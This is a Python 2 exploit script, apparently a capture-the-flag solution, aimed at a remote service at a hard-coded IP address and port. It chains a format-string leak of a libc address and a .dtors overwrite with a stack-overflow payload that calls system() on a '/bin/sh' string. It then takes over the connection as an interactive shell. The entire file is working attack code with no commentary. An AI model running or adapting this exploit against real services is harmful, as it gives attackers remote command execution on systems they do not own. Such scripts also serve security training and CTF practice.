from socket import *
from struct import *
import telnetlib
import time
import sys

def recv_until(s, data):
	buf = ""
	while True:
		c = s.recv(1)
		buf += c
		if data in buf:
			break
	return buf

def remote_debug(flag):
    if(flag == True):
        print"[+] Remote debugging mode"
        time.sleep(10)
        raw_input("Dbg is ready?")

#host = 'localhost'
host = '175.119.158.131'
port = 17171

s = socket( AF_INET, SOCK_STREAM )
s.connect((host,port))

if len(sys.argv) == 2:
	remote_debug(True)
else:
	remote_debug(False)

dtor_addr = 0x080496dc
cmd_addr = 0x08049848
printf_got = 0x080497dc
printf_plt = 0x8048350

payload = ""
payload+= "AALEAP%2$p%33996c%14$hnAAAAA"
payload+= pack("<L", dtor_addr)
f = s.makefile(mode='w')
f.write(payload + "\n")
f.flush()

recv_until(s, "AALEAP")
leaked_libc = int(s.recv(10)[2:], 16)
print "[INFO] Leaked addr: %s " % hex(leaked_libc)

system_offset = 0x17c480
sh_offset = 0x57fe5
system_addr = leaked_libc - system_offset
sh_addr = leaked_libc - sh_offset
print "[INFO] SYS: %s" % hex(system_addr)
print "[INFO] SH : %s" % hex(sh_addr)

payload = ""
payload+= "A"*716
payload+= pack("<L", system_addr)
payload+= "BBBB"
payload+= pack("<L", sh_addr)
s.send(payload + "\n")

try:
        t = telnetlib.Telnet()
        t.sock = s
        t.interact()
        t.close()
except KeyboardInterrupt:
        pass


